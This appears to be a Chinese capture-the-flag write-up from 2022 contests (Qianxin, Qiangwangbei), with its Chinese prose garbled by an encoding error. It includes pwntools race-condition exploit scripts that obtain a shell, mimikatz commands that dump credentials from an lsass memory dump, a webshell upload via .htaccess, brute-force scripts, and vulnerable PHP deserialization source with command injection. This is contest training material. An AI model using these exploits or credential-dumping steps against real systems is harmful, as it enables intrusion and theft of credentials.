<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="race"><a href="#race" class="headerlink" title="race"></a>race</h2><p>idaåˆ†æï¼š<br>1ï¼šå½“iå¤§äº9ï¼Œä¸”è¾“å…¥ä¸ä¸º1æ—¶ï¼Œä¼šè°ƒç”¨<code>system(&quot;/bin/sh&quot;)</code>ï¼›<br>2ï¼šä¿®æ”¹içš„å€¼éœ€è¦è°ƒç”¨thread1å‡½æ•°ï¼Œåœ¨è¿™é‡Œå› ä¸º<code>count = 3</code> ï¼Œè€Œæ¯æ¬¡æ‰§è¡Œ<code>thread1</code>å‡½æ•°ï¼Œéƒ½ä¼šä½¿<code>count--</code>,<br>åœ¨æ­£å¸¸çš„ä½¿ç”¨ä¸­ï¼Œæœ€å¤šåªèƒ½æ‰§è¡Œä¸‰æ¬¡<code>i++</code>ï¼Œä¸è¿‡å› ä¸º<code>sleep(0xA)</code>çš„åŸå› ï¼Œçº¿ç¨‹ä¼šåœ¨éªŒè¯<code>count</code>çš„å€¼ä¹‹ååœä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™10ç§’ä¸­ï¼Œè°ƒç”¨å¤šæ¬¡<code>thread1</code>å‡½æ•°ï¼Œä½¿å¤šä¸ªçº¿ç¨‹å¡åœ¨<code>++i</code>æŒ‡ä»¤ä¹‹å‰ï¼Œåœ¨10ç§’ä¹‹åï¼Œå°±ä¼šæ‰§è¡Œå¤šæ¬¡<code>++i</code>æŒ‡ä»¤ï¼Œä½¿<code>i&gt;9</code>ï¼Œè¿™æ—¶è¾“å…¥ä¸€ä¸ªé1çš„æ•°å­—ï¼Œç¨‹åºå°±ä¼šè°ƒç”¨<code>system(&quot;/bin/sh&quot;)</code></p>
<p><img src="/img/wp/2022/2022qianxin-7.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;172.19.1.28&#x27;</span>,<span class="hljs-string">&#x27;10001&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>time.sleep(<span class="hljs-number">0xb</span>)<br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2022/2022qianxin-8.png"></p>
<h2 id="race2"><a href="#race2" class="headerlink" title="race2"></a>race2</h2><p>åœ¨<code>file_read</code>å‡½æ•°ä¸­ï¼Œå½“<code>buf</code>å­—ç¬¦ä¸²ä¸­ä¸å­˜åœ¨<code>flag</code>æ—¶ï¼Œä¼šå…ˆç­‰å¾…<code>5</code>ç§’<br>ç„¶åæ‰“å¼€<code>buf</code>å­—ç¬¦ä¸²æŒ‡å®šçš„æ–‡ä»¶ï¼Œå¹¶è¾“å‡ºæ–‡ä»¶å†…å®¹</p>
<p><img src="/img/wp/2022/2022qianxin-9.png"></p>
<p>ä½†å› ä¸ºç¨‹åºæ˜¯ä½¿ç”¨å¤šçº¿ç¨‹è°ƒç”¨çš„<code>file_read</code>å‡½æ•°ï¼Œæ‰€ä»¥ç¨‹åºåœ¨ç­‰å¾…<code>5</code>ç§’æ—¶ï¼Œæˆ‘ä»¬è¿˜æ˜¯å¯ä»¥ä¿®æ”¹<code>buf</code>å­—ç¬¦ä¸²çš„å€¼</p>
<p>æœ€ååªéœ€è¦å…ˆè®©çº¿ç¨‹æ‰§è¡Œåˆ°<code>sleep(5);</code>ä»£ç å¤„ï¼Œç„¶åå†è¾“å…¥<code>flag</code>ï¼Œç„¶åç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œç¨‹åºå°±ä¼šæ‰“å¼€é¶æœºä¸Šçš„<code>flag</code>æ–‡ä»¶ï¼Œå¹¶è¾“å‡ºå…¶å†…å®¹</p>
<p><img src="/img/wp/2022/2022qianxin-10.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>p=remote(<span class="hljs-string">&#x27;172.19.1.132&#x27;</span>,<span class="hljs-number">10002</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;abc&#x27;</span>)<br>time.sleep(<span class="hljs-number">1</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>time.sleep(<span class="hljs-number">5</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2022/2022qianxin-11.png"></p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="misc-3-hacker"><a href="#misc-3-hacker" class="headerlink" title="misc-3-hacker"></a>misc-3-hacker</h2><p>ä¸‹è½½å¾—åˆ°ä¸€ä¸ª<code>lsass.dmp</code>æ–‡ä»¶ï¼Œä»€ä¹ˆæ˜¯<code>lsass.dmp</code>å‘¢ï¼Œå®ƒæ˜¯<code>procdump</code>ä»<code>lsass.exe</code>ä¸­å¯¼å‡ºçš„å‡­æ®ï¼Œå¯ä»¥ç”¨<code>mimikatz</code>è¯»å–</p>
<p>æŠŠæ–‡ä»¶æ”¾åˆ°ç¨‹åºç›®å½•ä¸‹ï¼Œä»¥ç®¡ç†å‘˜è¿è¡Œ<code>mimikatz</code>ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p>
<div class="note note-info">
            <p>privilege::debug<br>sekurlsa::minidump lsass.dmp<br>sekurlsa::logonpasswords full</p>
          </div>


<p><img src="/img/wp/2022/2022qianxin-12.png"></p>
<p>å¦‚æœæŠ¥é”™<code>ERROR kuhl_m_sekurlsa_acquireLSA ; Minidump pInfos-&gt;ProcessorArchitecture (0) != PROCESSOR_ARCHITECTURE_AMD64 (9)</code></p>
<p>é‚£ä¹ˆå¯èƒ½æ˜¯æ¶æ„é”™äº†ï¼Œç”¨win32ç‰ˆæœ¬é‡æ–°è¿è¡Œå³å¯</p>
<h2 id="misc-3-funny-ASCII"><a href="#misc-3-funny-ASCII" class="headerlink" title="misc-3-funny ASCII"></a>misc-3-funny ASCII</h2><p>äºŒè¿›åˆ¶æ•°æ®è½¬æˆæ–‡æœ¬å³å¯</p>
<p><img src="/img/wp/2022/2022qianxin-13.png"></p>
<h2 id="misc-4-password"><a href="#misc-4-password" class="headerlink" title="misc-4-password"></a>misc-4-password</h2><p>æ‰“å¼€ä¸€çœ‹ï¼Œå‘ç°æœ‰å‡ ä¸ªæ–‡ä»¶å¾ˆå°ï¼Œåªæœ‰4</p>
<p><img src="/img/wp/2022/2022qianxin-14.png"></p>
<p>ä¸€èˆ¬å°äº6çš„æ–‡ä»¶æ˜¯å¯ä»¥è¿›è¡Œcrcçˆ†ç ´çš„ï¼Œæ¨è<a href="https://github.com/theonlypwner/crc32">å·¥å…·</a></p>
<p>ç”¨æ³•ï¼š<code>python crc32.py reverse crc</code></p>
<p><img src="/img/wp/2022/2022qianxin-15.png"></p>
<p>æå–å‡ºæ¥åè½¬å­—ç¬¦ä¸²å¾—åˆ°<code>easypassword</code>ï¼Œè§£å‹å¾—åˆ°flag</p>
<h2 id="misc103"><a href="#misc103" class="headerlink" title="misc103"></a>misc103</h2><p>æ ¹æ®é¢˜ç›®æè¿°æ¥çœ‹æ˜¯ä¸€é“æ•°æ®æ¢å¤é¢˜</p>
<p>fileå‘½ä»¤çœ‹ä¸‹æ–‡ä»¶<code>badimages: Linux rev 1.0 ext3 filesystem data, UUID=ca014691-c6ea-4a5a-8da4-74a1aa1c9a80</code></p>
<p>å¯ä»¥çŸ¥é“æ˜¯linuxä¸‹çš„ext3æ–‡ä»¶ï¼Œlinuxä¸‹çš„æ–‡ä»¶æ¢å¤å¯ä»¥ç”¨<code>extundelete</code>å‘½ä»¤</p>
<p>çœ‹æ—¥å¿—ï¼š<code>extundelete &lt;file&gt; --journal</code></p>
<p><img src="/img/wp/2022/2022qianxin-16.png"></p>
<p>å°è¯•æ¢å¤æ‰€æœ‰ç›®å½•å’Œæ–‡ä»¶ï¼š<code>extundelete &lt;file&gt; --restore-all</code></p>
<p><img src="/img/wp/2022/2022qianxin-17.png"></p>
<p>æ¢å¤åˆ°<code>RECOVERED_FILES</code>ç›®å½•</p>
<p>flagåœ¨<code>RECOVERED_FILES/Flag.txt</code>ä¸­</p>
<h2 id="Misc-5-Forgotten-password"><a href="#Misc-5-Forgotten-password" class="headerlink" title="Misc-5-Forgotten password"></a>Misc-5-Forgotten password</h2><p>å–è¯é¢˜</p>
<p>ç¬¬ä¸€æ­¥è‚¯å®šæ˜¯è·å–å†…å­˜é•œåƒçš„åŸºæœ¬ä¿¡æ¯</p>
<p><img src="/img/wp/2022/2022qianxin-18.png"></p>
<p>æ ¹æ®hint<code>å°æ˜æ€»æ˜¯å–œæ¬¢passwordè®°å½•ä¸‹æ¥</code>ï¼Œç”¨<code>editbox</code>æ˜¾ç¤ºå‡ºæœ‰å…³ç¼–è¾‘æ§ä»¶çš„ä¿¡æ¯ï¼Œå¾—åˆ°å¯†ç <code>password*&amp;!@wxcq12</code></p>
<p><img src="/img/wp/2022/2022qianxin-19.png"></p>
<p>ç”¨å¯†ç ç›´æ¥äº¤ä¸å¯¹ï¼Œé‚£ä¹ˆåº”è¯¥æ˜¯å‹ç¼©åŒ…ä¹‹ç±»çš„å¯†ç äº†<br>æŸ¥æ‰¾å‹ç¼©åŒ…å¹¶å¯¼å‡º</p>
<p><img src="/img/wp/2022/2022qianxin-20.png"></p>
<p>ç”¨<code>editbox</code>å¾—åˆ°çš„å¯†ç è§£å‹å‹ç¼©åŒ…æ‹¿åˆ°flag</p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="Write-a-script"><a href="#Write-a-script" class="headerlink" title="Write a script"></a>Write a script</h2><p>md5çˆ†ç ´</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br>word=<span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span><br>r=itertools.product(word,repeat=<span class="hljs-number">3</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> r:<br><br>    dec =<span class="hljs-string">&quot;flag&#123;P7%sY0OG%s0XPC%sZPK&#125;&quot;</span>%(i[<span class="hljs-number">0</span>],i[<span class="hljs-number">1</span>],i[<span class="hljs-number">2</span>])<br>    dec=dec.strip()<br>    enc = hashlib.md5()<br>    enc.update(dec.encode())<br>    code=enc.hexdigest()<br>    code=code.strip()<br>    <span class="hljs-keyword">if</span> code[:<span class="hljs-number">4</span>]==<span class="hljs-string">&quot;9e86&quot;</span> <span class="hljs-keyword">and</span> code[-<span class="hljs-number">6</span>:]==<span class="hljs-string">&quot;0ea7cf&quot;</span>:<br>        <span class="hljs-built_in">print</span>(dec)<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2022/2022qianxin-21.png"></p>
<h2 id="base"><a href="#base" class="headerlink" title="base"></a>base</h2><p>ç»™äº†ä¸€ä¸ªpyæ–‡ä»¶å’Œæ˜æ–‡çš„md5å€¼</p>
<p>ä»£ç ä¸­æ˜æ–‡base64åŠ å¯†ä¹‹åå°†å°å†™å­—æ¯å…¨éƒ¨å˜ä¸ºå¤§å†™</p>
<p>ä½¿ç”¨è„šæœ¬æš´åŠ›ç ´è§£</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*-coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>    m1 = hashlib.md5(<span class="hljs-built_in">str</span>).hexdigest()<br>    <span class="hljs-keyword">if</span> m1 == <span class="hljs-string">&#x27;16478a151bdd41335dcd69b270f6b985&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>list1=itertools.product([<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>],[<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>],[<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-string">&#x27;f&#x27;</span>],[<span class="hljs-string">&#x27;Z&#x27;</span>,<span class="hljs-string">&#x27;z&#x27;</span>],[<span class="hljs-string">&#x27;Z&#x27;</span>,<span class="hljs-string">&#x27;z&#x27;</span>],[<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>],[<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>],[<span class="hljs-string">&#x27;0&#x27;</span>],[<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>],[<span class="hljs-string">&#x27;3&#x27;</span>],[<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>],[<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>],[<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>],[<span class="hljs-string">&#x27;3&#x27;</span>],[<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>],[<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>],[<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>],[<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>],[<span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>],[<span class="hljs-string">&#x27;Z&#x27;</span>,<span class="hljs-string">&#x27;z&#x27;</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> list1:<br>    str1=<span class="hljs-string">&#x27;&#x27;</span>.join(i)<br>    <span class="hljs-keyword">if</span> check(base64.b64decode(str1)):<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;The Flag is &quot;</span>+base64.b64decode(str1)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;not &quot;</span>+str1<br></code></pre></td></tr></table></figure>



<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="ä¸€å¼ æ¥è‡ªå¤å¤©çš„è½¦ç¥¨"><a href="#ä¸€å¼ æ¥è‡ªå¤å¤©çš„è½¦ç¥¨" class="headerlink" title="ä¸€å¼ æ¥è‡ªå¤å¤©çš„è½¦ç¥¨"></a>ä¸€å¼ æ¥è‡ªå¤å¤©çš„è½¦ç¥¨</h2><p>pycæ–‡ä»¶ï¼Œå…ˆè¿›è¡Œåç¼–è¯‘</p>
<p><code>uncompyle6 exp.pyc &gt; exp.py</code>å¤±è´¥ï¼Œä¿®å¤ä¸‹æ–‡ä»¶</p>
<p>fileçœ‹ä¸‹ç‰ˆæœ¬ï¼Œæ˜¯3.6çš„</p>
<p><img src="/img/wp/2022/2022qianxin-22.png"></p>
<p>æ„é€ ä¸€ä¸ª3.6ç”Ÿæˆçš„pycæ–‡ä»¶ä¸<code>exp.pyc</code>å¯¹æ¯”</p>
<p>ä¼šå‘ç°ä¸­é—´å°‘äº†å››ä¸ªå­—èŠ‚</p>
<p><img src="/img/wp/2022/2022qianxin-23.png"></p>
<p>å¡«å……ä¸Š<code>00</code></p>
<p><img src="/img/wp/2022/2022qianxin-24.png"></p>
<p>åç¼–è¯‘åè¿è¡Œå¾—åˆ°flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># uncompyle6 version 3.8.0</span><br><span class="hljs-comment"># Python bytecode 3.6 (3379)</span><br><span class="hljs-comment"># Decompiled from: Python 3.9.2 (tags/v3.9.2:1a79785, Feb 19 2021, 13:44:55) [MSC v.1928 64 bit (AMD64)]</span><br><span class="hljs-comment"># Embedded file name: exp.py</span><br><span class="hljs-comment"># Compiled at: 2021-06-10 15:30:34</span><br><span class="hljs-keyword">import</span> base64<br>key = <span class="hljs-string">&#x27;e4b5e6d3-bc5a-475b-8c26-d3941ed9b90f&#x27;</span><br>enc = <span class="hljs-string">&#x27;XQdSA1YEV1IAAFMGUwAAA1AGAFkFBwcAAQQPVwRVXAxXDFFf&#x27;</span><br><span class="hljs-built_in">print</span>(key[(<span class="hljs-built_in">len</span>(key) - <span class="hljs-number">1</span>)])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode2</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">return</span> base64.urlsafe_b64decode(m)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode1</span>(<span class="hljs-params">m, key</span>):<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key) - <span class="hljs-number">6</span>):<br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(key[i]) ^ <span class="hljs-built_in">ord</span>(<span class="hljs-built_in">chr</span>(m[i])))<br><br>    <span class="hljs-keyword">return</span> flag<br><br><br><span class="hljs-built_in">print</span>(decode2(enc))<br>tmp = decode1(decode2(enc), key)<br><span class="hljs-built_in">print</span>(tmp)<br><span class="hljs-comment"># okay decompiling exp.pyc</span><br></code></pre></td></tr></table></figure>

<h2 id="å•Šï¼Ÿ"><a href="#å•Šï¼Ÿ" class="headerlink" title="å•Šï¼Ÿ"></a>å•Šï¼Ÿ</h2><p>å®‰å“é€†å‘é¢˜ï¼Œå…ˆåœ¨æ¨¡æ‹Ÿå™¨ä¸Šå®‰è£…ï¼Œæ‰¾åˆ°éªŒè¯å‡½æ•°</p>
<p><img src="/img/wp/2022/2022qianxin-25.png"></p>
<p>è·³è½¬åˆ°<code>check</code>æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">M</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">T</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">check</span><span class="hljs-params">(String str)</span> &#123;<br>        String key;<br>        <span class="hljs-keyword">if</span> (str.length() != <span class="hljs-number">16</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>();<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            key = m0getey();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            key = getKey();<br>            System.arraycopy(key, <span class="hljs-number">0</span>, str, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>);<br>        &#125;<br>        <span class="hljs-type">int</span>[] iArr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">16</span>];<br>        iArr[<span class="hljs-number">0</span>] = <span class="hljs-number">42</span>;<br>        iArr[<span class="hljs-number">12</span>] = <span class="hljs-number">14</span>;<br>        iArr[<span class="hljs-number">10</span>] = <span class="hljs-number">7</span>;<br>        iArr[<span class="hljs-number">14</span>] = <span class="hljs-number">15</span>;<br>        iArr[<span class="hljs-number">15</span>] = <span class="hljs-number">17</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            iArr[<span class="hljs-number">1</span>] = <span class="hljs-number">43</span>;<br>            iArr[<span class="hljs-number">5</span>] = <span class="hljs-number">5</span>;<br>            System.out.println();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e2) &#123;<br>            iArr[<span class="hljs-number">5</span>] = <span class="hljs-number">37</span>;<br>            iArr[<span class="hljs-number">1</span>] = <span class="hljs-number">85</span>;<br>        &#125;<br>        iArr[<span class="hljs-number">6</span>] = <span class="hljs-number">15</span>;<br>        iArr[<span class="hljs-number">2</span>] = <span class="hljs-number">32</span>;<br>        iArr[<span class="hljs-number">3</span>] = <span class="hljs-number">23</span>;<br>        iArr[<span class="hljs-number">11</span>] = <span class="hljs-number">68</span>;<br>        iArr[<span class="hljs-number">4</span>] = <span class="hljs-number">85</span>;<br>        iArr[<span class="hljs-number">13</span>] = <span class="hljs-number">5</span>;<br>        iArr[<span class="hljs-number">9</span>] = <span class="hljs-number">7</span>;<br>        iArr[<span class="hljs-number">7</span>] = <span class="hljs-number">8</span>;<br>        iArr[<span class="hljs-number">8</span>] = <span class="hljs-number">22</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; str.length(); i++) &#123;<br>            <span class="hljs-keyword">if</span> ((iArr[i] &amp; <span class="hljs-number">255</span>) != ((str.charAt(i) ^ key.charAt(i % key.length())) &amp; <span class="hljs-number">255</span>)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>æœ¬é¢˜çš„å…³é”®å°±æ˜¯æœ€åé‚£ä¸ªifåˆ¤æ–­ï¼Œä¼šå°†è¾“å…¥çš„å­—ç¬¦ä¸²ä¸keyè¿›è¡Œå¼‚æˆ–ï¼Œå€¼å­˜å‚¨åœ¨<code>iArr</code>æ•°ç»„é‡Œ</p>
<p>ä»ä¸Šé¢è´´å‡ºä»£ç çš„ç¬¬å…«è¡Œè·³è½¬åˆ°<code>m0getey</code>å‡½æ•°è·å–key</p>
<p><img src="/img/wp/2022/2022qianxin-26.png"></p>
<p>è§£å¯†è„šæœ¬<br>å°†æ•°ç»„ä¸­çš„å€¼å’Œkeyé€ä¸ªå¼‚æˆ–å³å¯å¾—åˆ°flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">v1 = [<span class="hljs-number">42</span>, <span class="hljs-number">43</span>, <span class="hljs-number">32</span>, <span class="hljs-number">23</span>, <span class="hljs-number">85</span>, <span class="hljs-number">5</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">22</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>, <span class="hljs-number">68</span>, <span class="hljs-number">14</span>, <span class="hljs-number">5</span>, <span class="hljs-number">15</span>, <span class="hljs-number">17</span>]<br>key = <span class="hljs-string">&quot;anylab&quot;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((v1[x] &amp; <span class="hljs-number">255</span>) ^ (<span class="hljs-built_in">ord</span>(key[x % <span class="hljs-number">6</span>]) &amp; <span class="hljs-number">255</span>)), end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2022</tag>
        <tag>å¥‡å®‰ä¿¡</tag>
      </tags>
  </entry>
  <entry>
    <title>2022å¼ºå›½æ¯æŠ€æœ¯æŠ€èƒ½å¤§èµ›åˆèµ›wp</title>
    <url>/posts/fc877f48/</url>
    <content><![CDATA[<p>Rank: 10ï¼Œï¼ˆä¸œéƒ¨èµ›åŒºå¤ªå·äº†å§ï¼‰</p>
<p><img src="/img/wp/2022/2022qgb-1.png"></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="upload-lol"><a href="#upload-lol" class="headerlink" title="upload_lol"></a>upload_lol</h2><p>å…ˆä¼ .htaccessï¼Œå†ä¼ å›¾ç‰‡é©¬ï¼Œgetshell</p>
<p><img src="/img/wp/2022/2022qgb-2.png"></p>
<p>æœ‰ä¸ªå†…å®¹æ£€æµ‹ï¼Œphpç‰ˆæœ¬ä¸º5ï¼Œç”¨scriptæ ‡ç­¾ç»•è¿‡å³å¯<br><img src="/img/wp/2022/2022qgb-3.png"></p>
<p><img src="/img/wp/2022/2022qgb-4.png"></p>
<h2 id="ezpop-new"><a href="#ezpop-new" class="headerlink" title="ezpop_new"></a>ezpop_new</h2><p>æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br>    <span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;fopen&#x27;</span>,<span class="hljs-string">&#x27;fread&#x27;</span>,<span class="hljs-string">&#x27;file_get_contents&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>);<br>    <span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;nonono&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PingUtils</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ping -c4 $&#123;args[0]&#125;&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cindy</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$someone</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$phone</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">call</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;phone-&gt;<span class="hljs-title function_ invoke__">call</span>(<span class="hljs-variable">$this</span>-&gt;someone);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bob</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span>=True;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;flag)&#123;<br>            <span class="hljs-variable">$cindy</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cindy</span>();<br>            <span class="hljs-variable">$cindy</span>-&gt;someone =  <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;someone&#x27;</span>];<br>            <span class="hljs-variable">$cindy</span>-&gt;phone = <span class="hljs-string">&quot;p50&quot;</span>;<br>            <span class="hljs-comment">#var_dump(filter(serialize($cindy)));</span><br>            <span class="hljs-variable">$cindy</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$cindy</span>)));<br>            <span class="hljs-variable">$cindy</span>-&gt;<span class="hljs-title function_ invoke__">call</span>(<span class="hljs-variable">$someone</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;flag = False;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Alice</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;c-&gt;b;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br></code></pre></td></tr></table></figure>

